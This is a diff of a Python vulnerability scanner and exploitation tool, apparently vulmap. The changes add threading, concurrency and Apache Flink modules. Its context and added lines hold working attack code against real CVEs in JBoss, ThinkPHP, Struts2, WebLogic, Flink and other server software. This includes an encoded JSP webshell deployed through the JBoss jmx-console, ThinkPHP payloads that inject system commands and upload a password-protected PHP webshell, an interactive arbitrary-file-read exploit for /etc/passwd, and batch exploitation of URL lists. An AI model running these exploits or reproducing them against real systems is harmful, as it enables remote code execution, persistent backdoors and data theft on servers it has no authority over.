             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
@@ -13932,11 +14341,12 @@ class OracleWeblogic():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
-            
+        self.threadLock.release()
 
 class RedHatJBoss():
     def __init__(self, url):
         self.url = url
+        self.threadLock = threading.Lock()
         self.name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
         self.getipport = urlparse(self.url)
         self.hostname = self.getipport.hostname
@@ -13952,7 +14362,7 @@ class RedHatJBoss():
         self.headers = {
             "Content-Type" : "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
             "Accept" : "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
+            'User-Agent': USER_AGENT
         }
 
         self.jsp_webshell = ("%3c%25%40%20%70%61%67%65%20%6c%61%6e%67%75%61%67%65%3d%22%6a%61%76%61%22%20%69%6d%70"
@@ -14123,6 +14533,7 @@ class RedHatJBoss():
         
     # 2020-09-23    
     def cve_2010_0738(self):
+        self.threadLock.acquire()
         http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
         self.pocname = "RedHat JBoss: CVE-2010-0738"
         self.info = color.de() + color.green(" [jmx-console]")
@@ -14137,7 +14548,7 @@ class RedHatJBoss():
         self.exp = ("?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName="
             "store&argType=java.lang.String&arg0=" + self.name + ".war&argType=java.lang.String&arg1="+self.name+"&argType=java"
             ".lang.String&arg2=.jsp&argType=java.lang.String&arg3=" + self.jsp_webshell + "&argType=boolean&arg4=True")
-        self.headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        self.headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 'User-Agent': USER_AGENT,
             "Connection": "keep-alive"}
         try:
             if VULN is None:
@@ -14154,10 +14565,12 @@ class RedHatJBoss():
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
         
     # 2020-09-24
     def cve_2010_1428(self):
+        self.threadLock.acquire()
         self.pocname = "RedHat JBoss: CVE-2010-1428"
         self.info = color.de() + color.green(" [web-console]")
         self.path = "/web-console/Invoker"
@@ -14183,10 +14596,12 @@ class RedHatJBoss():
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
             
     # 2020-09-23 RedHat JBoss: CVE-2015-7501, JMXInvokerServlet
     def cve_2015_7501(self):
+        self.threadLock.acquire()
         self.pocname = "RedHat JBoss: CVE-2015-7501"
         self.info = color.de() + color.green(" [JMXInvokerServlet]")
         self.path = "/invoker/JMXInvokerServlet"
@@ -14213,10 +14628,12 @@ class RedHatJBoss():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
 
 class ThinkPHP():
     def __init__(self, url):
         self.url = url
+        self.threadLock = threading.Lock()
         self.payload_cve_2018_20062 = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=RECOMMAND"
         self.payload_cve_2019_9082 = ("/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&"
             "vars[0]=system&vars[1][]=RECOMMAND")
@@ -14225,6 +14642,7 @@ class ThinkPHP():
             "(@$_POST[%27SHELLPASS%27]);?>")
     
     def cve_2018_20062(self):
+        self.threadLock.acquire()
         self.pocname = "ThinkPHP: CVE-2018-20062"
         self.info = color.rce()
         self.payload = self.payload_cve_2018_20062.replace("RECOMMAND", CMD)
@@ -14232,7 +14650,7 @@ class ThinkPHP():
         self.method = "post"
         self.rawdata = "null"
         try:
-            self.request = requests.post(self.url + self.path, data=self.payload, headers=headers, timeout=TIMEOUT, verify=False)
+            self.request = requests.post(self.url + self.path, data=self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
@@ -14240,16 +14658,18 @@ class ThinkPHP():
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)           
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+        self.threadLock.release()
       
     def cve_2019_9082(self):
+        self.threadLock.acquire()
         self.pocname = "ThinkPHP: CVE-2019-9082"
         self.info = color.rce()
         self.payload = self.payload_cve_2019_9082.replace("RECOMMAND", CMD)
         self.method = "get"
         self.rawdata = "null"
         try:
-            self.request = requests.get(self.url + self.payload, headers=headers, timeout=TIMEOUT, verify=False)
+            self.request = requests.get(self.url + self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
             if CMD == "upload":
                 if os_check() == "linux" or os_check() == "other":
@@ -14259,7 +14679,7 @@ class ThinkPHP():
                     self.filename = input(now.no_color_timed(de=DELAY) + "[+] WebShell Name (vulmap.php): ")
                     self.shellpass = input(now.no_color_timed(de=DELAY) + "[+] WebShell Password (123456): ")
                 self.payload = self.payload_cve_2019_9082_webshell.replace("FILENAME", self.filename).replace("SHELLPASS", self.shellpass)
-                self.request = requests.get(self.url + self.payload, headers=headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.get(self.url + self.payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
                 self.r = "WebShell: " + self.url + "/" + self.filename
                 verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
             
@@ -14270,152 +14690,187 @@ class ThinkPHP():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
-            
+        self.threadLock.release()
 
+class Start():
+    def __init__(self):
+        self.threadLock = threading.Lock()
+        self.thread_poc = []
+        self.process_poc = []
+        self.start_gevent = []
 
-
-# 漏洞验证方法
-class Start(object):
-    def output(url):
+    def ready_scan(self, url):
+        self.url = url
         if RUNALLPOC is not True:
-            print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Start scan target: " + str(url)))
-            #if OUTPUT is not None and args.file is not None:
-            #    print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Scan results output to: " + OUTPUT))
-            #    verify.text_output("[*] " + str(url))
+            # 单个web组件的线程池在这里创建
+            if THREADNUM != 10:
+                print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Custom thread number: " + str(THREADNUM)))
+            self.thread_pool = ThreadPoolExecutor(THREADNUM)
+            # 批量扫描文件时
+            if RUNALLPOC == "FILE":
+                pass
+            else:
+                print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Start scan target: " + str(self.url)))
                 
-    def onepoc_output(self):
-        if RUNALLPOC == True:
+    def onepoc_output(self, url):
+        self.url = url
+        if RUNALLPOC is not True:
+            if RUNALLPOC == "FILE":
+                pass
+            else:
+                # 等待单个web组件的线程池结束
+                wait(self.thread_poc, return_when=ALL_COMPLETED)
+                print(now.timed(de=0) + color.yeinfo() + color.yellow(" Scan completed and ended                        "))
+
+    def allvulnscan(self, url):
+        self.url = url
+        # 所有web组件的线程池在这里创建
+        if THREADNUM != 10:
+            print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Custom thread number: " + str(THREADNUM)))
+        self.thread_pool = ThreadPoolExecutor(THREADNUM)
+        print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Start scan target: " + str(url)))
+        print(now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Use all vulnerability scanning"))
+        if OUTPUT is not None:
+            verify.text_output("[*] " + str(url))
+        # 对webapps线程开启协程
+        self.start_gevent.append(spawn(run.apache_activemq, self.url))
+        self.start_gevent.append(spawn(run.apache_flink, self.url))
+        self.start_gevent.append(spawn(run.apache_shiro, self.url))
+        self.start_gevent.append(spawn(run.apache_solr, self.url))
+        self.start_gevent.append(spawn(run.apache_strtus2, self.url))
+        self.start_gevent.append(spawn(run.apache_tomcat, self.url))
+        self.start_gevent.append(spawn(run.apache_unomi, self.url))
+        self.start_gevent.append(spawn(run.drupal, self.url))
+        self.start_gevent.append(spawn(run.elasticsearch, self.url))
+        self.start_gevent.append(spawn(run.jenkins, self.url))
+        self.start_gevent.append(spawn(run.nexus, self.url))
+        self.start_gevent.append(spawn(run.oracle_weblogic, self.url))
+        self.start_gevent.append(spawn(run.redhat_jboss, self.url))
+        self.start_gevent.append(spawn(run.thinkphp, self.url))
+        joinall(self.start_gevent)
+        # 等待进程池所有进程结束后在运行主线程
+        wait(self.thread_poc, return_when=ALL_COMPLETED)
+        if RUNALLPOC == "FILE":
             pass
         else:
             print(now.timed(de=0) + color.yeinfo() + color.yellow(" Scan completed and ended                        "))
-    def allvulnscan(self):
-        print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Start scan target: " + str(self)))
-        print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Use all vuln poc"))
-        if OUTPUT is not None:
-            print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Scan results output to: " + OUTPUT))
-            verify.text_output("[*] " + str(self))
-        Start.apache_activemq(self)
-        Start.apache_shiro(self)
-        Start.apache_solr(self)
-        Start.apache_strtus2(self)
-        Start.apache_tomcat(self)
-        Start.apache_unomi(self)
-        Start.drupal(self)
-        Start.elasticsearch(self)
-        Start.jenkins(self)
-        Start.nexus(self)
-        Start.oracle_weblogic(self)
-        Start.redhat_jboss(self)
-        Start.thinkphp(self)
-        print(now.timed(de=0) + color.yeinfo() + color.yellow(" Scan completed and ended                        "))
-    def apache_activemq(self):
-        Start.output(self)
-        PocApacheActiveMQ=ApacheActiveMQ(self)
-        PocApacheActiveMQ.cve_2015_5254()
-        PocApacheActiveMQ.cve_2016_3088()
-        Start.onepoc_output(self)
-    def apache_shiro(self):
-        Start.output(self)
-        PocApacheShiro=ApacheShiro(self)
-        PocApacheShiro.cve_2016_4437()
-        Start.onepoc_output(self)
-    def apache_solr(self):
-        Start.output(self)
-        PocApacheSolr=ApacheSolr(self)
-        PocApacheSolr.cve_2017_12629()
-        PocApacheSolr.cve_2019_0193()
-        PocApacheSolr.cve_2019_17558()
-        Start.onepoc_output(self)
-    def apache_strtus2(self):
-        Start.output(self)
-        PocApacheStruts2=ApacheStruts2(self)
-        PocApacheStruts2.s2_005()
-        PocApacheStruts2.s2_008()
-        PocApacheStruts2.s2_009()
-        PocApacheStruts2.s2_013()
-        PocApacheStruts2.s2_015()
-        PocApacheStruts2.s2_016()
-        PocApacheStruts2.s2_029()
-        PocApacheStruts2.s2_032()
-        PocApacheStruts2.s2_045()
-        PocApacheStruts2.s2_046()
-        PocApacheStruts2.s2_048()
-        PocApacheStruts2.s2_052()
-        PocApacheStruts2.s2_057()
-        PocApacheStruts2.s2_059()
-        PocApacheStruts2.s2_061()
-        PocApacheStruts2.s2_devMode()
-        Start.onepoc_output(self)
-    def apache_tomcat(self):
-        Start.output(self)
-        PocApacheTomcat=ApacheTomcat(self)
-        PocApacheTomcat.tomcat_examples()
-        PocApacheTomcat.cve_2017_12615()
-        PocApacheTomcat.cve_2020_1938()
-        Start.onepoc_output(self)
-    def apache_unomi(self):
-        Start.output(self)
-        PocApacheUnomi=ApacheUnomi(self)
-        PocApacheUnomi.cve_2020_13942()
-        Start.onepoc_output(self)
-    def drupal(self):
-        Start.output(self)
-        PocDrupal = Drupal(self)
-        PocDrupal.cve_2018_7600()
-        PocDrupal.cve_2018_7602()
-        PocDrupal.cve_2019_6340()
-        Start.onepoc_output(self)
-    def elasticsearch(self):
-        Start.output(self)
-        PocElasticsearch = Elasticsearch(self)
-        PocElasticsearch.cve_2014_3120()
-        PocElasticsearch.cve_2015_1427()
-        Start.onepoc_output(self)
-    def jenkins(self):
-        Start.output(self)
-        PocJenkins = Jenkins(self)
-        PocJenkins.cve_2017_1000353()
-        PocJenkins.cve_2018_1000861()
-        Start.onepoc_output(self)
-    def nexus(self):
-        Start.output(self)
-        PocNexus=Nexus(self)
-        PocNexus.cve_2019_7238()
-        PocNexus.cve_2020_10199()
-        Start.onepoc_output(self)
-    def oracle_weblogic(self):
-        Start.output(self)
-        PocOracleWeblogic=OracleWeblogic(self)
-        PocOracleWeblogic.cve_2014_4210()
-        PocOracleWeblogic.cve_2017_3506()
-        PocOracleWeblogic.cve_2017_10271()
-        PocOracleWeblogic.cve_2018_2894()
-        PocOracleWeblogic.cve_2019_2725()
-        PocOracleWeblogic.cve_2019_2729()
-        PocOracleWeblogic.cve_2020_2551()
-        PocOracleWeblogic.cve_2020_2555()
-        PocOracleWeblogic.cve_2020_2883()
-        PocOracleWeblogic.cve_2020_14882()
-        Start.onepoc_output(self)
-    def redhat_jboss(self):
-        Start.output(self)
-        PocRedHatJBoss = RedHatJBoss(self)
-        PocRedHatJBoss.cve_2010_0738()
-        PocRedHatJBoss.cve_2010_1428()
-        PocRedHatJBoss.cve_2015_7501()
-        Start.onepoc_output(self)
-    def thinkphp(self):
-        Start.output(self)
-        PocThinkPHP = ThinkPHP(self)
-        PocThinkPHP.cve_2018_20062()
-        PocThinkPHP.cve_2019_9082()
-        Start.onepoc_output(self)
 
+    def apache_activemq(self, url):
+        run.ready_scan(url)
+        PocApacheActiveMQ=ApacheActiveMQ(url)
+        self.thread_poc.append(self.thread_pool.submit(PocApacheActiveMQ.cve_2015_5254))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheActiveMQ.cve_2016_3088))
+        run.onepoc_output(url)
+    def apache_flink(self, url):
+        run.ready_scan(url)
+        PocApacheFlink=ApacheFlink(url)
+        self.thread_poc.append(self.thread_pool.submit(PocApacheFlink.cve_2020_17518))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheFlink.cve_2020_17519))
+        run.onepoc_output(url)
+    def apache_shiro(self, url):
+        run.ready_scan(url)
+        PocApacheShiro=ApacheShiro(self.url)
+        self.thread_poc.append(self.thread_pool.submit(PocApacheShiro.cve_2016_4437))
+        run.onepoc_output(self.url)
+    def apache_solr(self, url):
+        run.ready_scan(url)
+        PocApacheSolr=ApacheSolr(self.url)
+        self.thread_poc.append(self.thread_pool.submit(PocApacheSolr.cve_2017_12629))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheSolr.cve_2019_0193))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheSolr.cve_2019_17558))
+        run.onepoc_output(self.url)
+    def apache_strtus2(self, url):
+        run.ready_scan(url)
+        PocApacheStruts2=ApacheStruts2(url)
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_005))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_008))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_009))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_013))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_015))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_016))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_029))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_032))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_045))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_046))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_048))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_052))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_057))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_059))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_061))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheStruts2.s2_devMode))
+        run.onepoc_output(url)
+    def apache_tomcat(self, url):
+        run.ready_scan(url)
+        PocApacheTomcat=ApacheTomcat(self.url)
+        self.thread_poc.append(self.thread_pool.submit(PocApacheTomcat.tomcat_examples))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheTomcat.cve_2017_12615))
+        self.thread_poc.append(self.thread_pool.submit(PocApacheTomcat.cve_2020_1938))
+        run.onepoc_output(self.url)
+    def apache_unomi(self, url):
+        run.ready_scan(url)
+        PocApacheUnomi=ApacheUnomi(self.url)
+        self.thread_poc.append(self.thread_pool.submit(PocApacheUnomi.cve_2020_13942))
+        run.onepoc_output(self.url)
+    def drupal(self, url):
+        run.ready_scan(url)
+        PocDrupal=Drupal(self.url)
+        self.thread_poc.append(self.thread_pool.submit(PocDrupal.cve_2018_7600))
+        self.thread_poc.append(self.thread_pool.submit(PocDrupal.cve_2018_7602))
+        self.thread_poc.append(self.thread_pool.submit(PocDrupal.cve_2019_6340))
+        run.onepoc_output(self.url)
+    def elasticsearch(self, url):
+        run.ready_scan(url)
+        PocElasticsearch=Elasticsearch(self.url)
+        self.thread_poc.append(self.thread_pool.submit(PocElasticsearch.cve_2014_3120))
+        self.thread_poc.append(self.thread_pool.submit(PocElasticsearch.cve_2015_1427))
+        run.onepoc_output(self.url)
+    def jenkins(self, url):
+        run.ready_scan(url)
+        PocJenkins=Jenkins(self.url)
+        self.thread_poc.append(self.thread_pool.submit(PocJenkins.cve_2017_1000353))
+        self.thread_poc.append(self.thread_pool.submit(PocJenkins.cve_2018_1000861))
+        run.onepoc_output(self.url)
+    def nexus(self, url):
+        run.ready_scan(url)
+        PocNexus=Nexus(self.url)
+        self.thread_poc.append(self.thread_pool.submit(PocNexus.cve_2019_7238))
+        self.thread_poc.append(self.thread_pool.submit(PocNexus.cve_2020_10199))
+        run.onepoc_output(self.url)
+    def oracle_weblogic(self, url):
+        run.ready_scan(url)
+        PocOracleWeblogic=OracleWeblogic(self.url)
+        self.thread_poc.append(self.thread_pool.submit(PocOracleWeblogic.cve_2014_4210))
+        self.thread_poc.append(self.thread_pool.submit(PocOracleWeblogic.cve_2017_3506))
+        self.thread_poc.append(self.thread_pool.submit(PocOracleWeblogic.cve_2017_10271))
+        self.thread_poc.append(self.thread_pool.submit(PocOracleWeblogic.cve_2018_2894))
+        self.thread_poc.append(self.thread_pool.submit(PocOracleWeblogic.cve_2019_2725))
+        self.thread_poc.append(self.thread_pool.submit(PocOracleWeblogic.cve_2019_2729))
+        self.thread_poc.append(self.thread_pool.submit(PocOracleWeblogic.cve_2020_2551))
+        self.thread_poc.append(self.thread_pool.submit(PocOracleWeblogic.cve_2020_2555))
+        self.thread_poc.append(self.thread_pool.submit(PocOracleWeblogic.cve_2020_2883))
+        self.thread_poc.append(self.thread_pool.submit(PocOracleWeblogic.cve_2020_14882))
+        run.onepoc_output(self.url)
+    def redhat_jboss(self, url):
+        run.ready_scan(url)
+        PocRedHatJBoss = RedHatJBoss(self.url)
+        self.thread_poc.append(self.thread_pool.submit(PocRedHatJBoss.cve_2010_0738))
+        self.thread_poc.append(self.thread_pool.submit(PocRedHatJBoss.cve_2010_1428))
+        self.thread_poc.append(self.thread_pool.submit(PocRedHatJBoss.cve_2015_7501))
+        run.onepoc_output(self.url)
+    def thinkphp(self, url):
+        run.ready_scan(url)
+        PocThinkPHP = ThinkPHP(self.url)
+        self.thread_poc.append(self.thread_pool.submit(PocThinkPHP.cve_2018_20062))
+        self.thread_poc.append(self.thread_pool.submit(PocThinkPHP.cve_2019_9082))
+        run.onepoc_output(self.url)
+
+    # 漏洞利用目前在这里，后期再优化
     def exploit(self, vuln):
         global VULN
         VULN = vuln
         global CMD
         ExpApacheActiveMQ = ApacheActiveMQ(self)
+        ExpApacheFlink = ApacheFlink(self)
         ExpApacheShiro = ApacheShiro(self)
         ExpApacheSolr = ApacheSolr(self)
         ExpApacheStruts2 = ApacheStruts2(self)
@@ -14431,11 +14886,9 @@ class Start(object):
         print (now.timed(de=DELAY)+color.yeinfo()+color.cyan(" Target url: "+str(self)))
         print (now.timed(de=DELAY)+color.yeinfo()+color.cyan(" Use exploit modules: "+VULN))
         # RCE
-        
         if VULN not in explists:
             print(now.timed(de=0) + color.rewarn() + color.red(" The vulnerability does not support exploitation. Please refer to \"--list\""))
             sys.exit(0)
-            
         while True:
             if VULN == "CVE-2016-4437":
                 if os_check() == "linux" or os_check() == "other":
@@ -14485,6 +14938,15 @@ class Start(object):
                 global CVE20201938
                 CVE20201938 = CMD
                 ExpApacheTomcat.cve_2020_1938()
+            elif VULN == "CVE-2020-17519":
+                print(now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Examples: /etc/passwd"))
+                if os_check() == "linux" or os_check() == "other":
+                    CMD = input(now.timed(de=DELAY)+color.green("[+] File >>> "))
+                elif os_check() == "windows":
+                    CMD = input(now.no_color_timed(de=DELAY)+"[+] File >>> ")
+                if CMD == "exit" or CMD == "quit" or CMD == "bye":
+                    exit(0)
+                ExpApacheFlink.cve_2020_17519()
             elif VULN == "CVE-2020-10199":
                 if os_check() == "linux" or os_check() == "other":
                     nexus_u = input(now.timed(de=DELAY) + color.green("[+] Input username: "))
@@ -14617,10 +15079,11 @@ class Start(object):
                     print(color.exp_upload())
                 elif VULN == "CVE-2018-20062":
                     ExpThinkPHP.cve_2018_20062()
-                
+run = Start()
+
 class Target:
     def allvuln_url(self):
-        Start.allvulnscan(self)
+        run.allvulnscan(self)
     def allvuln_file(self):
         if OUTPUT is not None:
             print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Scan results output to: " + OUTPUT))
@@ -14632,58 +15095,47 @@ class Target:
                 furl = url_check(furl)
                 if not furl:
                     break
-                if OUTPUT is not None:
-                   verify.text_output("[*] " + str(furl))
                 survival = survival_check(furl)
                 if survival == "f":
                     print(now.timed(de=0) + color.rewarn() + color.red(" Survival check failed: " + furl))
+                    if OUTPUT is not None:
+                       verify.text_output("[*] " + str(furl))
                     continue
-                else:
-                    print(now.timed(de=DELAY) + color.yeinfo() + color.yellow(" ========== Batch target =========="))
-                    print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Start scan target: " + furl))
-                Start.apache_activemq(furl)
-                Start.apache_shiro(furl)
-                Start.apache_solr(furl)
-                Start.apache_strtus2(furl)
-                Start.apache_tomcat(furl)
-                Start.apache_unomi(furl)
-                Start.drupal(furl)
-                Start.elasticsearch(furl)
-                Start.jenkins(furl)
-                Start.nexus(furl)
-                Start.oracle_weblogic(furl)
-                Start.redhat_jboss(furl)
-                Start.thinkphp(furl)
+                run.allvulnscan(furl)
         print(now.timed(de=0) + color.yeinfo() + color.yellow(" Batch scan completed and ended                       "))
 
     def webapps_url(self, webapps):
+        if OUTPUT is not None:
+            verify.text_output("[*] " + str(self))
         print(now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run " + webapps + " vulnerability scan"))
         if webapps == "activemq":
-            Start.apache_activemq(self)
+            run.apache_activemq(self)
+        elif webapps == "flink":
+            run.apache_flink(self)
         elif webapps == "shiro":
-            Start.apache_shiro(self)
+            run.apache_shiro(self)
         elif webapps == "solr":
-            Start.apache_solr(self)
+            run.apache_solr(self)
         elif webapps == "struts2":
-            Start.apache_strtus2(self)
+            run.apache_strtus2(self)
         elif webapps == "tomcat":
-            Start.apache_tomcat(self)
+            run.apache_tomcat(self)
         elif webapps == "unomi":
-            Start.apache_unomi(self)
+            run.apache_unomi(self)
         elif webapps == "deupal":
-            Start.drupal(self)
+            run.drupal(self)
         elif webapps == "elasticsearch":
-            Start.elasticsearch(self)
+            run.elasticsearch(self)
         elif webapps == "jenkins":
-            Start.jenkins(self)
+            run.jenkins(self)
         elif webapps == "nexus":
-            Start.nexus(self)
+            run.nexus(self)
         elif webapps == "weblogic":
-            Start.oracle_weblogic(self)
+            run.oracle_weblogic(self)
         elif webapps == "jboss":
-            Start.redhat_jboss(self)
+            run.redhat_jboss(self)
         elif webapps == "thinkphp":
-            Start.thinkphp(self)
+            run.thinkphp(self)
         else:
             print(now.timed(de=DELAY) + color.rewarn() + color.red(" The webapps are not supported"))
             sys.exit(0)
@@ -14700,259 +15152,46 @@ class Target:
                 furl = url_check(furl)
                 if not furl:
                     break
-                if OUTPUT is not None:
-                   verify.text_output("[*] " + str(furl))
                 survival = survival_check(furl)
                 if survival == "f":
                     print(now.timed(de=0) + color.rewarn() + color.red(" Survival check failed: " + furl))
+                    if OUTPUT is not None:
+                       verify.text_output("[*] " + str(furl))
                     continue
-
                 if webapps == "activemq":
-                    Start.apache_activemq(furl)
+                    run.apache_activemq(furl)
+                elif webapps == "flink":
+                    run.apache_flink(furl)
                 elif webapps == "shiro":
-                    Start.apache_shiro(furl)
+                    run.apache_shiro(furl)
                 elif webapps == "solr":
-                    Start.apache_solr(furl)
+                    run.apache_solr(furl)
                 elif webapps == "struts2":
-                    Start.apache_strtus2(furl)
+                    run.apache_strtus2(furl)
                 elif webapps == "tomcat":
-                    Start.apache_tomcat(furl)
+                    run.apache_tomcat(furl)
                 elif webapps == "unomi":
-                    Start.apache_unomi(furl)
+                    run.apache_unomi(furl)
                 elif webapps == "deupal":
-                    Start.drupal(furl)
+                    run.drupal(furl)
                 elif webapps == "elasticsearch":
-                    Start.elasticsearch(furl)
+                    run.elasticsearch(furl)
                 elif webapps == "jenkins":
-                    Start.jenkins(furl)
+                    run.jenkins(furl)
                 elif webapps == "nexus":
-                    Start.nexus(furl)
+                    run.nexus(furl)
                 elif webapps == "weblogic":
-                    Start.oracle_weblogic(furl)
+                    run.oracle_weblogic(furl)
                 elif webapps == "jboss":
-                    Start.redhat_jboss(furl)
+                    run.redhat_jboss(furl)
                 elif webapps == "thinkphp":
-                    Start.thinkphp(furl)
+                    run.thinkphp(furl)
                 else:
                     print(now.timed(de=DELAY)+color.rewarn()+color.red(" The webapps are not supported"))
                     sys.exit(0)
 
-
-
-
-    # Apache ActiveMQ =====================================
-    def apache_activemq_url(self):
-        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache ActiveMQ vulnerability scan"))
-        Start.apache_activemq(self)
-    def apache_activemq_file(self):
-        with open(self) as f:
-            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache ActiveMQ vulnerability scan"))
-            while True:
-                furl = f.readline()
-                furl = furl.strip('\r\n')
-                furl = furl.strip()
-                if not furl:
-                    break
-                if furl[-1] == "/":
-                    furl = furl[:-1]
-                Start.apache_activemq(furl)
-
-    # Apache Shiro ========================================
-    def apache_shiro_url(self):
-        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Shiro vulnerability scan"))
-        Start.apache_shiro(self)
-    def apache_shiro_file(self):
-        with open(self) as f:
-            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Shiro vulnerability scan"))
-            while True:
-                furl = f.readline()
-                furl = furl.strip('\r\n')
-                furl = furl.strip()
-                if not furl:
-                    break
-                if furl[-1] == "/":
-                    furl = furl[:-1]
-                Start.apache_shiro(furl)
-    # Apache Solr =========================================
-    def apache_solr_url(self):
-        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Solr vulnerability scan"))
-        Start.apache_solr(self)
-    def apache_solr_file(self):
-        with open(self) as f:
-            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Solr vulnerability scan"))
-            while True:
-                furl = f.readline()
-                furl = furl.strip('\r\n')
-                furl = furl.strip()
-                if not furl:
-                    break
-                if furl[-1] == "/":
-                    furl = furl[:-1]
-                Start.apache_solr(furl)
-    # Apache Struts2 ======================================
-    def apache_struts2_url(self):
-        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Struts2 vulnerability scan"))
-        Start.apache_strtus2(self)
-    def apache_struts2_file(self):
-        with open(self) as f:
-            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Struts2 vulnerability scan"))
-            while True:
-                furl = f.readline()
-                furl = furl.strip('\r\n')
-                furl = furl.strip()
-                if not furl:
-                    break
-                if furl[-1] == "/":
-                    furl = furl[:-1]
-                Start.apache_strtus2(furl)
-    # Apache Tomcat =======================================
-    def apache_tomcat_url(self):
-        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Tomcat vulnerability scan"))
-        Start.apache_tomcat(self)
-    def apache_tomcat_file(self):
-        with open(self) as f:
-            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Tomcat vulnerability scan"))
-            while True:
-                furl = f.readline()
-                furl = furl.strip('\r\n')
-                furl = furl.strip()
-                if not furl:
-                    break
-                if furl[-1] == "/":
-                    furl = furl[:-1]
-                Start.apache_tomcat(furl)
-    # Apache Unomi ========================================
-    def apache_unomi_url(self):
-        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Tomcat vulnerability scan"))
-        Start.apache_unomi(self)
-    def apache_unomi_file(self):
-        with open(self) as f:
-            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Tomcat vulnerability scan"))
-            while True:
-                furl = f.readline()
-                furl = furl.strip('\r\n')
-                furl = furl.strip()
-                if not furl:
-                    break
-                if furl[-1] == "/":
-                    furl = furl[:-1]
-                Start.apache_unomi(furl)
-    # Drupal ==============================================
-    def drupal_url(self):
-        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Drupal vulnerability scan"))
-        Start.drupal(self)
-    def drupal_file(self):
-        with open(self) as f:
